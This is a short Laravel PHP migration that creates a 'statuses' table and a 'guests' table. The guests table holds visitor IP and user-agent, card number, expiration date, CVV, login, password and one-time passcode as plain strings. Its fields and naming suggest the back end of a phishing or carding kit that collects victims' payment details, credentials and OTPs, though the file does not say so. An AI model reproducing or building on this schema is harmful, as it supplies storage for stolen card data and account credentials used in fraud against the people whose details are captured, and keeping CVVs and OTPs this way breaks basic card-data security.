<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('statuses', function (Blueprint $table) {
            $table->id();

            $table->string('name')->unique();

            $table->timestamps();
        });

        Schema::create('guests', function (Blueprint $table) {
            $table->id();

            $table->string('token')->nullable();
            $table->foreignId('status_id')->default(1)->references('id')->on('statuses')->constrained()->cascadeOnUpdate()->cascadeOnDelete();
            $table->string('user-agent');
            $table->string('user');
            $table->string('ip');
            $table->string('cc');
            $table->string('expiration_date');
            $table->string('ccv');
            $table->string('login')->nullable();
            $table->string('pass')->nullable();
            $table->string('otp')->nullable();

            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('guests');
    }
};
